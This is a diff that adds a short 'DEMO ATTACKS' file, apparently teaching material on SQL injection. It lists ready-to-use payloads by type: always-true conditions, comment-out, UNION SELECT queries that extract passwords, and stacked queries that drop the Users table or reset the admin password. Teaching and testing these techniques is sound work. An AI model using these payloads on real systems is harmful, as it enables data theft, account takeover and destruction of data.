@@ -1,0 +1,19 @@
+DEMO ATTACKS
+
+Type 1: The “always true” condition
+username = huy' OR 'x'='x
+username = huy' OR TRUE -- 
+age = 105 or 1=1
+
+Type 2: The “Comment-out"
+username = huy' -- 
+
+Type 3: The "Union"
+password = ...' UNION ALL SELECT 1,1 FROM Users -- 
+password = ' UNION ALL SELECT password, username FROM Users WHERE username='profspooner' -- 
+password = ' UNION ALL SELECT count(*), username FROM Users -- 
+
+Type 4: “Stacked” queries
+username = huy'; DROP TABLE Users; --
+username = huy'; INSERT INTO Users VALUES ('new','new'); -- 
+username = huy'; UPDATE Users SET password = 'new' WHERE username = 'admin' -- 
